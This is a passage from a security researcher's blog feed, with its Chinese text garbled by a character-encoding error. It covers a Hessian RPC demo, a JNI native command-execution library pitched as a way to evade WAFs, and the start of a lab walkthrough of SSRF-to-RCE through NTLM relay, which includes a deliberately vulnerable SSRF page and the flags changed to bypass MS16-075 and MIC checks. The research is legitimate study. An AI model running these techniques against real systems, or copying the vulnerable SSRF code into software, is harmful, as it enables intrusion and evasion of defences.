class="string">"http://localhost:8080/hessianTest_war_exploded/api/service"</span>;</span><br><span class="line">        HessianProxyFactory factory = <span class="keyword">new</span> HessianProxyFactory();</span><br><span class="line">        IBasicApi api = (IBasicApi) factory.create(IBasicApi<span class="class">.<span class="keyword">class</span>, <span class="title">url</span>)</span>;</span><br><span class="line">        api.setUserName(<span class="string">"mahc"</span>);</span><br><span class="line">        System.out.println(api.sayHello());</span><br><span class="line">        System.out.println(api.getUser().getName());</span><br><span class="line">        System.out.println(api.getUser().getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>serverç«¯ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.syclover.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.syclover.hessian.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BasicService</span> <span class="keyword">implements</span> <span class="title">IBasicApi</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">setUserName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello "</span> + name + <span class="string">",Welcome to Hessian!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User(name, <span class="number">23</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.syclover.hessian;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String name, Integer age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸ºäº†æµ‹è¯•æ–¹ä¾¿æŠŠc/sæ”¾åˆ°ä¸€èµ·äº†<br><img src="1578060757509-0a3de905-6438-4bea-bfab-f18df997a87a.png" alt="image.png"></p><h3 id="è¿›è¡ŒRPC"><a href="#è¿›è¡ŒRPC" class="headerlink" title="è¿›è¡ŒRPC"></a>è¿›è¡ŒRPC</h3><p><img src="1578060910923-4235fecb-4e57-4c19-990c-5ea3502505a5.png" alt="image.png"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/mahoking/article/details/51704966">Hessianä½¿ç”¨æ•™ç¨‹</a><br><a href="https://juejin.im/entry/595996e25188250d8324118d">JVM ç±»è£…è½½åŸç†åˆ†æï¼ClassLoaderåŸç†åˆ†æ</a><br><a href="https://www.iteye.com/topic/245238">hessian åºåˆ—åŒ–å®ç° åˆæ¢</a></p>]]></content>
    
    <summary type="html">
    
      Hessianæ˜¯ä¸€ä¸ªè½»é‡çº§çš„remotingonhttpå·¥å…·ï¼Œä½¿ç”¨ç®€å•çš„æ–¹æ³•æä¾›äº†RMIçš„åŠŸèƒ½
    
    </summary>
    
    
      <category term="web security" scheme="https://cl0und.github.io/categories/web-security/"/>
    
    
      <category term="java" scheme="https://cl0und.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>JAVA JNI æ‰§è¡Œå‘½ä»¤ä¸è°ƒè¯•</title>
    <link href="https://cl0und.github.io/2019/12/31/JAVA-JNI-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%B8%8E%E8%B0%83%E8%AF%95/"/>
    <id>https://cl0und.github.io/2019/12/31/JAVA-JNI-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%B8%8E%E8%B0%83%E8%AF%95/</id>
    <published>2019-12-31T08:16:26.000Z</published>
    <updated>2020-07-11T08:03:10.861Z</updated>
    
    <content type="html"><![CDATA[<!-- JNIæ˜¯Java Native Interfaceçš„ç¼©å†™ï¼Œåˆ©ç”¨å®ƒå¯ä»¥åœ¨æ¯”è¾ƒåº•å±‚çš„ä½ç½®æ‰§è¡Œå‘½ä»¤ã€‚ --><!-- more --><h1 id="JAVA-JNI-æ‰§è¡Œå‘½ä»¤ä¸è°ƒè¯•"><a href="#JAVA-JNI-æ‰§è¡Œå‘½ä»¤ä¸è°ƒè¯•" class="headerlink" title="JAVA JNI æ‰§è¡Œå‘½ä»¤ä¸è°ƒè¯•"></a>JAVA JNI æ‰§è¡Œå‘½ä»¤ä¸è°ƒè¯•</h1><p><a name="ipGc8"></a></p><h2 id="æ‰§è¡Œå‘½ä»¤"><a href="#æ‰§è¡Œå‘½ä»¤" class="headerlink" title="æ‰§è¡Œå‘½ä»¤"></a>æ‰§è¡Œå‘½ä»¤</h2><p>ä»£ç åŸºæœ¬æŠ„è‡ªè‡ªå›­é•¿çš„demoï¼ˆä¸ºäº†ç¯‡å¹…çœç•¥äº†ä½œè€…ä¿¡æ¯ï¼Œè¿™é‡Œç»Ÿä¸€è¯´æ˜ä¸€ä¸‹ï½ï¼‰</p><p>JNIçš„å¥½å¤„åœ¨äºåº•å±‚ï¼Œå®æˆ˜ä¸­å¯ç”¨ç»•è¿‡ä¸€äº›wafæ‹¦æˆªå§ã€‚</p><p>CommandExecution.java</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandExecution</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> native String <span class="title">exec</span><span class="params">(String cmd)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘CommandExecutionï¼Œå¹¶ç”Ÿæˆnativeå±‚cä»£ç éœ€è¦ç”¨çš„å¤´æ–‡ä»¶</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac -cp . CommandExecution.java</span><br><span class="line">javah -cp . CommandExecution</span><br></pre></td></tr></table></figure><p>CommandExecution.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"CommandExecution.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jstring</span><br><span class="line"></span><br><span class="line">JNICALL CommandExecution_exec</span><br><span class="line">        (JNIEnv *env, jclass jclass, jstring str) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (str != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        jboolean jsCopy;</span><br><span class="line">        <span class="comment">// å°†jstringå‚æ•°è½¬æˆcharæŒ‡é’ˆ</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *cmd = env-&gt;GetStringUTFChars(str, &amp;jsCopy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿ç”¨popenå‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line">        FILE *fd  = popen(cmd, <span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fd != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// è¿”å›ç»“æœå­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="built_in">string</span> result;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å®šä¹‰å­—ç¬¦ä¸²æ•°ç»„</span></span><br><span class="line">            <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è¯»å–popenå‡½æ•°çš„æ‰§è¡Œç»“æœ</span></span><br><span class="line">            <span class="keyword">while</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), fd) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="comment">// æ‹¼æ¥è¯»å–åˆ°çš„ç»“æœåˆ°result</span></span><br><span class="line">                result +=buf;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å…³é—­popen</span></span><br><span class="line">            pclose(fd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœç»™Java</span></span><br><span class="line">            <span class="keyword">return</span> env-&gt;NewStringUTF(result.c_str());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ï¼Œæ³¨æ„è¿™é‡Œä¸ºäº†åç»­èƒ½å¤Ÿè°ƒè¯•éœ€è¦åŠ  <code>-g</code> å‚æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -fPIC -I<span class="string">"$JAVA_HOME/include"</span> -I<span class="string">"$JAVA_HOME/include/linux"</span> -shared -g -o libcmd.so CommandExecution.cpp</span><br></pre></td></tr></table></figure><p>MainTest.java</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainTest</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.load(<span class="string">"/home/anonymous/Desktop/learnjni/libcmd.so"</span>);</span><br><span class="line">        CommandExecution commandExecution = <span class="keyword">new</span> CommandExecution();</span><br><span class="line">        System.out.println(commandExecution.exec(<span class="string">"whoami"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac MainTest.java</span><br><span class="line">java MainTest</span><br></pre></td></tr></table></figure><p><img src="1577718523328-184106f3-09eb-46c1-bf96-43a560463d68.png" alt=""></p><p><a name="GgaID"></a></p><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>è°ƒè¯•éœ€è¦åŒæ—¶å®‰è£…JetBrainå®¶çš„ideaå’Œclionï¼Œå¹¶ä¸”clionè¦ä»¥ç®¡ç†å‘˜æƒé™ï¼ˆsudoï¼‰å¯åŠ¨ã€‚</p><ul><li>åœ¨è°ƒç”¨nativeå±‚çš„åœ°æ–¹æ‰“æ–­ç‚¹</li><li>é€šè¿‡jpsæ‰¾åˆ°æ‰€è¿è¡Œçš„javaç±»å¯¹åº”çš„ç±»çš„ç¼–å·</li><li>åœ¨clioné€‰æ‹©Run-&gt;Attach to Process ç„¶åattachåˆ°å“åº”ç¼–å·ä¸Š</li><li>åœ¨ä¸‹æ–­ç‚¹åœ°æ–¹æ­¥å…¥</li></ul><p><img src="1577718596131-2f54a43f-5d26-4aad-ae09-294069574301.png" alt=""></p><p>æ­¥è¿‡findNativeåå°±ä¼šè·³è½¬åˆ°clioné‡Œé¢ç„¶åå°±å¯ä»¥æ„‰å¿«çš„è°ƒè¯•äº†ï½<br /><img src="1577718822468-c0f6a1cf-2889-4539-aebe-aa0cda8fdd0a.png" alt=""><br><a name="0XEa5"></a></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.youtube.com/watch?v=8Cjeq4l5COU">recipeNoD002 - Debugging JNI code with IntelliJ/CLion</a><br /><a href="https://www.jianshu.com/p/8c510102e879">IntellJ IDEAä¸­JNIå•æ­¥è°ƒè¯•æŒ‡å—</a><br /><a href="https://javasec.org/javase/JNI/">JNIå®‰å…¨åŸºç¡€</a></p>]]></content>
    
    <summary type="html">
    
      JNIæ˜¯Java Native Interfaceçš„ç¼©å†™ï¼Œåˆ©ç”¨å®ƒå¯ä»¥åœ¨æ¯”è¾ƒåº•å±‚çš„ä½ç½®æ‰§è¡Œå‘½ä»¤ã€‚
    
    </summary>
    
    
      <category term="web security" scheme="https://cl0und.github.io/categories/web-security/"/>
    
    
      <category term="java" scheme="https://cl0und.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>åšå®¢é‡å¯å°è®°</title>
    <link href="https://cl0und.github.io/2019/12/22/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0/"/>
    <id>https://cl0und.github.io/2019/12/22/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0/</id>
    <published>2019-12-22T02:27:51.000Z</published>
    <updated>2024-08-11T08:49:04.725Z</updated>
    
    <content type="html"><![CDATA[<p>å¤§çº¦æ˜¯åœ¨ä¸€ä¸ƒå¹´é‚£ä¸ªå¯’å‡å¼€å§‹å†™æŠ€æœ¯åšå®¢ï¼Œä¸­é—´æ–­æ–­ç»­ç»­çš„æ›´æ–°åˆ°ä¸€å…«å¹´å…­æœˆã€‚é‡æ–°å†™åšå®¢æ˜¯èµ·äºä»Šå¹´ä¹æœˆä»½çš„ä¸´æ—¶èµ·æ„ï¼Œä¸€æ–¹é¢æ˜¯æƒ³ç£ä¿ƒè‡ªå·±â€œæœ‰æ„è¯†â€çš„è¿›æ­¥ï¼Œå¦å¤–ä¸€æ–¹é¢æ˜¯å‡è£…åšåšæŠ€æœ¯è¾“å‡ºã€‚æœ€å¼€å§‹åšå®¢ç”¨çš„æ˜¯hexoï¼Œé‡å¯ä¹‹åå¦èµ·ç‚‰ç¶ç”¨æ˜¯wordpressï¼Œå› ä¸ºå¹¶ä¸æƒ³ä»˜äº‘æœåŠ¡å™¨æœˆç§Ÿæ‰€ä»¥å†³å®šæ¢å›hexoã€‚åœ¨å¼ƒæ›´åˆ°é‡å¯è¿™æ®µæœŸé—´å› ä¸ºæ¢è¿‡æ–°ç¬”è®°æœ¬å¹¶ä¸”å†åŠ ä¸Šæ²¡æœ‰å¤‡ä»½ï¼Œæ‰€ä»¥ä¹‹å‰çš„åšå®¢æ–‡ç« çš„mdç‰ˆå·²ç»ç¾éš¾æ€§çš„æ¶ˆå¤±ã€‚å¤§çº¦èŠ±äº†ä¸€å¤©å¤šçš„æ—¶é—´æ…¢æ…¢æŠŠç½‘é¡µæ‰‹å·¥æ¢å¤æˆç¬¦åˆhexoæ ¼å¼çš„mdï¼ˆå¤§æ¦‚éƒ¨åˆ†æ–‡ç« ä»ç„¶ä¼šæœ‰æ ¼å¼ä¸Šçš„é”™è¯¯ï¼‰ï¼Œåœ¨æ•´ç†çš„æ—¶å€™å‘ç°è‡ªå·±ä»¥å‰çš„æ–‡ç« è¡¨æ„ä¸æ¸…ï¼Œéƒ¨åˆ†åœ°æ–¹æ˜¯ç‰‡é¢ç”šè‡³é”™è¯¯çš„ï¼ˆä»¥åæŠ½æ—¶é—´æ…¢æ…¢æ”¹ï¼Œå’•å’•å’•ï¼Ÿï¼‰ã€‚ä»¥ä¸Šï½</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å¤§çº¦æ˜¯åœ¨ä¸€ä¸ƒå¹´é‚£ä¸ªå¯’å‡å¼€å§‹å†™æŠ€æœ¯åšå®¢ï¼Œä¸­é—´æ–­æ–­ç»­ç»­çš„æ›´æ–°åˆ°ä¸€å…«å¹´å…­æœˆã€‚é‡æ–°å†™åšå®¢æ˜¯èµ·äºä»Šå¹´ä¹æœˆä»½çš„ä¸´æ—¶èµ·æ„ï¼Œä¸€æ–¹é¢æ˜¯æƒ³ç£ä¿ƒè‡ªå·±â€œæœ‰æ„è¯†â€çš„è¿›æ­¥ï¼Œå¦å¤–ä¸€æ–¹é¢æ˜¯å‡è£…åšåšæŠ€æœ¯è¾“å‡ºã€‚æœ€å¼€å§‹åšå®¢ç”¨çš„æ˜¯hexoï¼Œé‡å¯ä¹‹åå¦èµ·ç‚‰ç¶ç”¨æ˜¯wordpressï¼Œå› ä¸ºå¹¶ä¸æƒ³ä»˜äº‘æœåŠ¡å™¨æœˆç§Ÿæ‰€ä»¥å†³å®šæ¢å›hexoã€‚åœ¨å¼ƒæ›´åˆ°é‡å¯è¿™æ®µæœŸé—´å› ä¸ºæ¢è¿‡æ–°ç¬”è®°æœ¬å¹¶ä¸”å†åŠ ä¸Šæ²¡æœ‰å¤‡ä»½ï¼Œæ‰€ä»¥ä¹‹å‰çš„åšå®¢æ–‡ç« çš„mdç‰ˆå·²ç»ç¾éš¾æ€§çš„æ¶ˆå¤±ã€‚å¤§çº¦èŠ±äº†ä¸€å¤©å¤šçš„æ—¶é—´æ…¢æ…¢æŠŠç½‘é¡µæ‰‹å·¥æ¢å¤æˆç¬¦åˆhexoæ ¼å¼çš„mdï¼ˆå¤§æ¦‚éƒ¨åˆ†æ–‡ç« ä»ç„¶ä¼šæœ‰æ ¼å¼ä¸Šçš„é”™è¯¯ï¼‰ï¼Œåœ¨æ•´ç†çš„æ—¶å€™å‘ç°è‡ªå·±ä»¥å‰çš„æ–‡ç« è¡¨æ„ä¸æ¸…ï¼Œéƒ¨åˆ†åœ°æ–¹æ˜¯ç‰‡é¢ç”šè‡³é”™è¯¯çš„ï¼ˆä»¥åæŠ½æ—¶é—´æ…¢æ…¢æ”¹ï¼Œå’•å’•å’•ï¼Ÿï¼‰ã€‚ä»¥ä¸Šï½&lt;/p&gt;

    
    </summary>
    
    
    
      <category term="æ‚" scheme="https://cl0und.github.io/tags/%E6%9D%82/"/>
    
  </entry>
  
  <entry>
    <title>Using Java&#39;s SSRF vulnerability rce via ntlm relay</title>
    <link href="https://cl0und.github.io/2019/12/19/Using%20Java%E2%80%99s%20SSRF%20vulnerability%20rce%20via%20ntlm%20relay/"/>
    <id>https://cl0und.github.io/2019/12/19/Using%20Java%E2%80%99s%20SSRF%20vulnerability%20rce%20via%20ntlm%20relay/</id>
    <published>2019-12-18T16:00:00.000Z</published>
    <updated>2020-07-11T08:03:59.722Z</updated>
    
    <content type="html"><![CDATA[<!-- ç»•è¿‡ MS16-075 å’Œ MICæ ¡éªŒè¿›è¡Œntlm relay --><!-- more --><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>å®éªŒå®¤ç¯å¢ƒè¯´æ˜<br>â€¢ 6.1.7601 Service Pack 1 Build 7601<br>â€¢ jdk1.7.0_80<br>â€¢ å·¥ä½œç»„ç¯å¢ƒ</p><p>å®éªŒä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.BufferedReader"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.InputStreamReader"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.net.URL"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.net.URLConnection"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String ssrf = request.getParameter(<span class="string">"ssrf"</span>);</span><br><span class="line">    URL url = <span class="keyword">new</span> URL(ssrf);</span><br><span class="line">    URLConnection connection = url.openConnection();</span><br><span class="line">    connection.setRequestProperty(<span class="string">"user-agent"</span>, <span class="string">"javasec"</span>);</span><br><span class="line">    connection.setConnectTimeout(<span class="number">1000</span>);</span><br><span class="line">    connection.setReadTimeout(<span class="number">1000</span>);</span><br><span class="line">    connection.connect();</span><br><span class="line">    connection.getHeaderFields();</span><br><span class="line">    connection.getInputStream();</span><br><span class="line">    StringBuilder resp = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    BufferedReader in = <span class="keyword">new</span> BufferedReader(</span><br><span class="line">            <span class="keyword">new</span> InputStreamReader(connection.getInputStream()));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        resp.append(<span class="string">"/n"</span>).append(line);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.print(resp.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>ä½¿ç”¨<a href="https://github.com/5alt/ultrarelay">ultrarelay</a>ç›‘å¬ç«¯å£ï¼Œè®¿é—®url <code>http://172.16.247.130:8888/ssrf.jsp?ssrf=http://172.16.247.1</code>è§¦å‘ssrfæ¼æ´æ—¶å¯ä»¥çœ‹åˆ°å·²ç»æŠŠå—å®³æœºçš„ntlm hashæ‹¿åˆ°äº†ã€‚<br><img src="./1576766596365.png" alt="Alt text"></p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>æœ¬è´¨ä¸Šå°±æ˜¯ä¸€æ¬¡ä»httpåˆ°smbè·¨åè®®ntlm relayæœ¬æœºï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“åœ¨ MS16-075ä¹‹åå¾®è½¯ä¿®å¤äº†http-&gt;smbçš„æœ¬æœºrelayã€‚æ‰€ä»¥ä¸ºäº†ç»•è¿‡è¿™ä¸ªé™åˆ¶éœ€è¦å°†type2(NTLMSSP_CHALLENGE)Negotiate Flagsä¸­çš„0x00004000è®¾ç½®ä¸º0ï¼Œä½†æ˜¯è®¾ç½®ä¸º0åä¼šå‡ºç°å¦å¤–ä¸€ä¸ªé—®é¢˜é‚£å°±æ˜¯MICéªŒè¯ä¼šä¸é€šè¿‡ï¼Œä¸ºäº†ç»•è¿‡è¿™ä¸ªé™åˆ¶åˆéœ€è¦æŠŠtype2 Negotiate Flagsä¸­çš„Negotiate Always Signè®¾ç½®ä¸º0ã€‚</p><p>å“åº”victim401å¹¶å¼€å¯ntlmè®¤è¯<br><img src="./1576766618381.png" alt="Alt text"></p><p>victom -&gt; http NTLMSSP_NEGOTIATE -&gt; hacker<br><img src="./1576766644960.png" alt="Alt text"></p><p>hacker -&gt; smb NTLMSSP_NEGOTIATE -&gt; victim<br><img src="./1576766672332.png" alt="Alt text"></p><p>victim-&gt;smb NTLMSSP_CHALLENGE -&gt; hacker<br><img src="./1576766704445.png" alt="Alt text"></p><p>hacker-&gt;http NTLMSSP_CHALLENGE -&gt; victimï¼Œé‡ç‚¹å°±åœ¨è¿™æ­¥åœ¨ç»™victimçš„httpåº”ç­”ä¸­å°†0x00004000å’ŒNegotiate Always Signéƒ½è®¾ç½®ä¸ºäº†0ã€‚<br><img src="./1576766730695.png" alt="Alt text"></p><p>victim-&gt; http NTLMSSP_AUTH -&gt;hacker<br><img src="./1576766771275.png" alt="Alt text"></p><p>hacker-&gt; smb NTLMSSP_AUTH -&gt;victim<br><img src="./1576766793902.png" alt="Alt text"></p><p>åé¢è®¤è¯æˆåŠŸåï¼Œå“åº”victim 404ï¼Œå¹¶è¿æ¥victimçš„IPC$è¿›è¡Œåç»­rceæ“ä½œã€‚<br><img src="./1576766820232.png" alt="Alt text"></p><h2 id="æˆåŠŸæ¡ä»¶"><a href="#æˆåŠŸæ¡ä»¶" 